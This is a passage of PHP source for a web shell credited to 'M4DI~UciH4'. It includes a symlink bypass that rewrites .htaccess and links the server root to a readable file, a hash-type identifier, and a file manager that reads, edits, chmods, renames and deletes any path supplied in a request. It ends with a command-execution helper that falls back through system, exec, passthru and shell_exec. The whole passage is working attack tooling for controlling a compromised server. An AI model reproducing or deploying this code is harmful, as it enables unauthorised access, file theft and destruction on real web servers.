                    $write = fwrite($file, "Options Indexes FollowSymLinks\r\nDirectoryIndex ssssss.htm\r\nAddType txt .php\r\nAddHandler txt .php");
                    $Bok3p = symlink("/", "madi.txt");
                    $rt = "<br><a href=madi.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>\r\n\tBypassed Successfully</b></font></a>";
                    echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br><br><a href=madi.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>\r\n\tBypassed Successfully</b></font></a></center>";
                }
                echo "</form>";
            } elseif ($_GET['to'] == 'hashid') {
                if (isset($_POST['gethash'])) {
                    $hash = $_POST['hash'];
                    if (strlen($hash) == 32) {
                        $hashresult = "MD5 Hash";
                    } elseif (strlen($hash) == 40) {
                        $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
                    } elseif (strlen($hash) == 13) {
                        $hashresult = "DES(Unix) Hash";
                    } elseif (strlen($hash) == 16) {
                        $hashresult = "MySQL Hash / /DES(Oracle Hash)";
                    } elseif (strlen($hash) == 41) {
                        $GetHashChar = substr($hash, 40);
                        if ($GetHashChar == "*") {
                            $hashresult = "MySQL5 Hash";
                        }
                    } elseif (strlen($hash) == 64) {
                        $hashresult = "SHA-256 Hash";
                    } elseif (strlen($hash) == 96) {
                        $hashresult = "SHA-384 Hash";
                    } elseif (strlen($hash) == 128) {
                        $hashresult = "SHA-512 Hash";
                    } elseif (strlen($hash) == 34) {
                        if (strstr($hash, '$1$')) {
                            $hashresult = "MD5(Unix) Hash";
                        }
                    } elseif (strlen($hash) == 37) {
                        if (strstr($hash, '$apr1$')) {
                            $hashresult = "MD5(APR) Hash";
                        }
                    } elseif (strlen($hash) == 34) {
                        if (strstr($hash, '$H$')) {
                            $hashresult = "MD5(phpBB3) Hash";
                        }
                    } elseif (strlen($hash) == 34) {
                        if (strstr($hash, '$P$')) {
                            $hashresult = "MD5(Wordpress) Hash";
                        }
                    } elseif (strlen($hash) == 39) {
                        if (strstr($hash, '$5$')) {
                            $hashresult = "SHA-256(Unix) Hash";
                        }
                    } elseif (strlen($hash) == 39) {
                        if (strstr($hash, '$6$')) {
                            $hashresult = "SHA-512(Unix) Hash";
                        }
                    } elseif (strlen($hash) == 24) {
                        if (strstr($hash, '==')) {
                            $hashresult = "MD5(Base-64) Hash";
                        }
                    } else {
                        $hashresult = "Hash type not found";
                    }
                } else {
                    $hashresult = "Not Hash Entered";
                }
                ?>
	<center><br><br><br>
	
		<form action="" method="POST">
		<tr>
		<table >
		<th colspan="5">Hash Identification</th>
		<tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
		<tr class="optionstr"><b><td>Result</td><td>:</td><td><?php 
                echo $hashresult;
                ?></td></tr></b>
	</table></tr></form>
	</center><br>
<?php 
            }
            echo "</td></tr>";
            if (isset($_GET['filesrc'])) {
                echo "<tr><td>Current File : ";
                echo $_GET['filesrc'];
                echo "</tr></td></table><br />";
                echo '<pre>' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</pre>';
            } elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
                echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
                if ($_POST['opt'] == 'chmod') {
                    if (isset($_POST['perm'])) {
                        if (chmod($_POST['path'], $_POST['perm'])) {
                            echo "<font color=\"lime\">Change Permission OK</font><br/>";
                        } else {
                            echo "<font color=\"red\">Change Permission ERROR</font><br />";
                        }
                    }
                    echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
                } elseif ($_POST['opt'] == 'rename') {
                    if (isset($_POST['newname'])) {
                        if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                            echo "<font color=\"lime\">Rename OK</font><br/>";
                        } else {
                            echo "<font color=\"red\">Rename ERROR</font><br />";
                        }
                        $_POST['name'] = $_POST['newname'];
                    }
                    echo '<form method="POST">
Nama Baru : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Crotz" />
</form>';
                } elseif ($_POST['opt'] == 'edit') {
                    if (isset($_POST['src'])) {
                        $fp = fopen($_POST['path'], 'w');
                        if (fwrite($fp, $_POST['src'])) {
                            echo "<font color=\"lime\">Edit File OK</font><br/>";
                        } else {
                            echo "<font color=\"red\">Edit File ERROR</font><br/>";
                        }
                        fclose($fp);
                    }
                    echo '<form method="POST">
<textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
                }
                echo "</center>";
            } else {
                echo "</table><br/><center>";
                if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
                    if ($_POST['type'] == 'dir') {
                        if (rmdir($_POST['path'])) {
                            echo "<font color=\"lime\">OK</font><br/>";
                        } else {
                            echo "<font color=\"red\">ERROR</font><br/>";
                        }
                    } elseif ($_POST['type'] == 'file') {
                        if (unlink($_POST['path'])) {
                            echo "<font color=\"lime\">Delete File OK</font><br/>";
                        } else {
                            echo "<font color=\"red\">Delete File ERROR</font><br/>";
                        }
                    }
                }
                echo "</center>";
                $scandir = scandir($path);
                echo "<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\" align=\"center\">\r\n<tr class=\"first\">\r\n<td><center>Name</center></td>\r\n<td><center>Size</center></td>\r\n<td><center>Permission</center></td>\r\n<td><center>Modify</center></td>\r\n</tr>";
                foreach ($scandir as $dir) {
                    if (!is_dir($path . '/' . $dir) || $dir == '.' || $dir == '..') {
                        continue;
                    }
                    echo '<tr>
<td><a href="?path=' . $path . '/' . $dir . '">' . $dir . '</a></td>
<td><center>--</center></td>
<td><center>';
                    if (is_writable($path . '/' . $dir)) {
                        echo "<font color=\"lime\">";
                    } elseif (!is_readable($path . '/' . $dir)) {
                        echo "<font color=\"red\">";
                    }
                    echo perms($path . '/' . $dir);
                    if (is_writable($path . '/' . $dir) || !is_readable($path . '/' . $dir)) {
                        echo "</font>";
                    }
                    echo '</center></td>
<td><center><form method="POST" action="?option&path=' . $path . '">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="' . $dir . '">
<input type="hidden" name="path" value="' . $path . '/' . $dir . '">
<input type="submit" value=">">
</form></center></td>
</tr>';
                }
                echo "<tr class=\"first\"><td></td><td></td><td></td><td></td></tr>";
                foreach ($scandir as $file) {
                    if (!is_file($path . '/' . $file)) {
                        continue;
                    }
                    $size = filesize($path . '/' . $file) / 1024;
                    $size = round($size, 3);
                    if ($size >= 1024) {
                        $size = round($size / 1024, 2) . ' MB';
                    } else {
                        $size .= ' KB';
                    }
                    echo '<tr>
<td><a href="?filesrc=' . $path . '/' . $file . '&path=' . $path . '">' . $file . '</a></td>
<td><center>' . $size . '</center></td>
<td><center>';
                    if (is_writable($path . '/' . $file)) {
                        echo "<font color=\"lime\">";
                    } elseif (!is_readable($path . '/' . $file)) {
                        echo "<font color=\"red\">";
                    }
                    echo perms($path . '/' . $file);
                    if (is_writable($path . '/' . $file) || !is_readable($path . '/' . $file)) {
                        echo "</font>";
                    }
                    echo '</center></td>
<td><center><form method="POST" action="?option&path=' . $path . '">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="' . $file . '">
<input type="hidden" name="path" value="' . $path . '/' . $file . '">
<input type="submit" value=">">
</form></center></td>
</tr>';
                }
                echo "</table>\r\n</div>";
            }
            echo "<br/><center>[ <a href='?dir={$dir}&to=logout'><font color=red>Logout</a></font> ]";
            echo "<br/>Copyright &copy; " . date("Y") . " - M4DI~UciH4\r\n</body>\r\n</center>\r\n</html>";
            function perms($file)
            {
                $perms = fileperms($file);
                if (($perms & 0xc000) == 0xc000) {
                    // Socket
                    $info = 's';
                } elseif (($perms & 0xa000) == 0xa000) {
                    // Symbolic Link
                    $info = 'l';
                } elseif (($perms & 0x8000) == 0x8000) {
                    // Regular
                    $info = '-';
                } elseif (($perms & 0x6000) == 0x6000) {
                    // Block special
                    $info = 'b';
                } elseif (($perms & 0x4000) == 0x4000) {
                    // Directory
                    $info = 'd';
                } elseif (($perms & 0x2000) == 0x2000) {
                    // Character special
                    $info = 'c';
                } elseif (($perms & 0x1000) == 0x1000) {
                    // FIFO pipe
                    $info = 'p';
                } else {
                    // Unknown
                    $info = 'u';
                }
                $info .= $perms & 0x100 ? 'r' : '-';
                $info .= $perms & 0x80 ? 'w' : '-';
                $info .= $perms & 0x40 ? $perms & 0x800 ? 's' : 'x' : ($perms & 0x800 ? 'S' : '-');
                $info .= $perms & 0x20 ? 'r' : '-';
                $info .= $perms & 0x10 ? 'w' : '-';
                $info .= $perms & 0x8 ? $perms & 0x400 ? 's' : 'x' : ($perms & 0x400 ? 'S' : '-');
                $info .= $perms & 0x4 ? 'r' : '-';
                $info .= $perms & 0x2 ? 'w' : '-';
                $info .= $perms & 0x1 ? $perms & 0x200 ? 't' : 'x' : ($perms & 0x200 ? 'T' : '-');
                return $info;
            }
            function exe($cmd)
            {
                if (function_exists('system')) {
                    @ob_start();
                    @system($cmd);
                    $buff = @ob_get_contents();
                    @ob_end_clean();
                    return $buff;
                } elseif (function_exists('exec')) {
                    @exec($cmd, $results);
                    $buff = "";
                    foreach ($results as $result) {
                        $buff .= $result;
                    }
                    return $buff;
                } elseif (function_exists('passthru')) {
                    @ob_start();
                    @passthru($cmd);
                    $buff = @ob_get_contents();
                    @ob_end_clean();
                    return $buff;
                } elseif (function_exists('shell_exec')) {
                    $buff = @shell_exec($cmd);
                    return $buff;
                }
            }
      ?>